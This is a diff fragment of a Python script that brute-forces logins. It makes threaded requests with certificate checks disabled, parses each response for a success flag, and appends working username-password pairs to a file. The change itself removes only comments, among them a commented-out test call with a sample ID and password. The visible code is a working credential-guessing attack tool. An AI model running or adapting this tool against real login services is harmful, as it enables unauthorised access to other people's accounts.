@@ -29,7 +29,6 @@ def brute(session, username: str, password: str):
     r = session.get(url=url, headers=headers, verify=False)
     print(str(r.status_code) + '\t' + str(len(r.text)) + '\t' +
           username + '\t' + password + '\t', end='\t')
-    #print(r.text)
     s = re.findall(r'\((.*?)\)', r.text)
     j = json.loads(s[0])
     status = j['result']
@@ -37,7 +36,6 @@ def brute(session, username: str, password: str):
     if status == 1:
         with open('result.txt', mode='a+') as f:
             f.write(username + '\t' + password)
-
     if len(r.text) != 2930:
         exit(0)
 
@@ -51,4 +49,3 @@ if __name__ == '__main__':
             t = threading.Thread(target=brute, args=(session, username, password))
             t.start()
             time.sleep(0.005)
-#    brute(session,'2020304600' , '0321101')
